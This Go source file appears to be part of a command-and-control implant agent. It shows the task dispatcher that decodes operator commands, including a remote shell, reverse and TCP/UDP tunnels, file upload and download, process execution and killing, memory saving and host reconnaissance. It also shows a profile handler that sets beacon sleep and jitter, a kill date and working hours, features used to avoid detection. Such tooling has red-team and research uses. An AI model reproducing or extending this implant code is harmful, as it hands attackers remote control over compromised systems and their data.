package main

// processTasks decodes one response stream produced by ExtenderAgent.PackTasks:
//
//	uint32 LE  total length of the remainder
//	repeated:
//	    uint32 LE command id
//	    ... command specific arguments (LE lengths) ...
//	    uint32 LE task id
//
// The record layout is not self-delimiting, therefore an unknown opcode aborts
// the current buffer instead of desynchronising every following record.
func (a *agent) processTasks(data []byte) {
	if len(data) < 8 {
		return
	}
	r := newReader(data)
	total := int(r.u32())
	if total <= 0 || total > len(data)-4 {
		return
	}
	limit := total + 4

	for r.pos+8 <= limit {
		cmd := r.u32()
		switch cmd {
		case cmdPwd:
			a.cmdPwd(r)
		case cmdCd:
			a.cmdCd(r)
		case cmdTerm:
			a.cmdTerminate(r)
		case cmdCopy:
			a.cmdCopy(r)
		case cmdLs:
			a.cmdLs(r)
		case cmdDisks:
			a.cmdDisks(r)
		case cmdRm:
			a.cmdRm(r)
		case cmdMv:
			a.cmdMv(r)
		case cmdProfile:
			a.cmdProfile(r)
		case cmdGetUID:
			a.cmdGetUID(r)
		case cmdCat:
			a.cmdCat(r)
		case cmdMkdir:
			a.cmdMkdir(r)
		case cmdDownload:
			a.cmdDownload(r)
		case cmdDownloadState:
			a.cmdDownloadState(r)
		case cmdUpload:
			a.cmdUpload(r)
		case cmdPsList:
			a.cmdPsList(r)
		case cmdPsKill:
			a.cmdPsKill(r)
		case cmdPsRun:
			a.cmdPsRun(r)
		case cmdJobList:
			a.cmdJobsList(r)
		case cmdJobsKill:
			a.cmdJobsKill(r)
		case cmdSaveMemory:
			a.cmdSaveMemory(r)

		case cmdTunnelStartTCP:
			a.cmdTunnelStartTCP(r)
		case cmdTunnelStartUDP:
			a.cmdTunnelStartUDP(r)
		case cmdTunnelWriteTCP:
			a.cmdTunnelWriteTCP(r)
		case cmdTunnelWriteUDP:
			a.cmdTunnelWriteUDP(r)
		case cmdTunnelClose:
			a.cmdTunnelClose(r)
		case cmdTunnelReverse:
			a.cmdTunnelReverse(r)
		case cmdTunnelPause:
			a.cmdTunnelPause(r)
		case cmdTunnelResume:
			a.cmdTunnelResume(r)

		case cmdShellStart:
			a.cmdShellStart(r)
		case cmdShellWrite:
			a.cmdShellWrite(r)

		case cmdEnv:
			a.cmdEnv(r)
		case cmdNetstat:
			a.cmdNetstat(r)
		case cmdIfconfig:
			a.cmdIfconfig(r)
		case cmdService:
			a.cmdService(r)
		case cmdUname:
			a.cmdUname(r)
		case cmdChmod:
			a.cmdChmod(r)
		case cmdUsers:
			a.cmdUsers(r)
		case cmdSysinfo:
			a.cmdSysinfo(r)

		case cmdLink, cmdUnlink, cmdPivotExec, cmdExecBof, cmdExecBofOut:
			// Windows-only primitives (SMB/TCP pivots, BOF loader). The extender
			// never emits them for this agent type.
			a.debugf("refusing windows-only opcode %d", cmd)
			return

		default:
			a.debugf("unknown opcode %d, dropping buffer", cmd)
			return
		}
	}
}

func (a *agent) cmdTerminate(r *reader) {
	method := r.u32()
	taskID := r.u32()
	a.terminate(method, taskID)
}

func (a *agent) cmdProfile(r *reader) {
	sub := r.u32()
	switch sub {
	case 1: // sleep + jitter
		sleep := r.u32()
		jitter := r.u32()
		taskID := r.u32()
		a.cfg.Sleep = sleep
		a.cfg.Jitter = jitter
		a.reply(taskID, cmdProfile, func(w *writer) {
			w.u32(sub)
			w.u32(sleep)
			w.u32(jitter)
		})

	case 2: // download chunk size
		size := r.u32()
		taskID := r.u32()
		a.dl.mu.Lock()
		a.dl.chunk = int(size)
		a.dl.mu.Unlock()
		a.reply(taskID, cmdProfile, func(w *writer) {
			w.u32(sub)
			w.u32(size)
		})

	case 3: // kill date
		kill := r.u32()
		taskID := r.u32()
		a.cfg.KillDate = kill
		a.reply(taskID, cmdProfile, func(w *writer) {
			w.u32(sub)
			w.u32(kill)
		})

	case 4: // working time
		wt := r.u32()
		taskID := r.u32()
		a.cfg.WorkingTime = wt
		a.reply(taskID, cmdProfile, func(w *writer) {
			w.u32(sub)
			w.u32(wt)
		})

	case 5, 6: // DNS burst mode: accepted for wire compatibility, reported off
		if sub == 5 {
			_ = r.u32()
			_ = r.u32()
			_ = r.u32()
		}
		taskID := r.u32()
		a.reply(taskID, cmdProfile, func(w *writer) {
			w.u32(sub)
			w.u32(0)
			w.u32(0)
			w.u32(0)
		})

	default:
		taskID := r.u32()
		a.replyErrorCode(taskID, 22) // EINVAL
	}
}

func (a *agent) cmdGetUID(r *reader) {
	taskID := r.u32()
	user := userNameByUID(osGeteuid())
	a.reply(taskID, cmdGetUID, func(w *writer) {
		w.u8(boolByte(osGeteuid() == 0))
		w.str("") // no AD domain on POSIX
		w.str(user)
	})
}
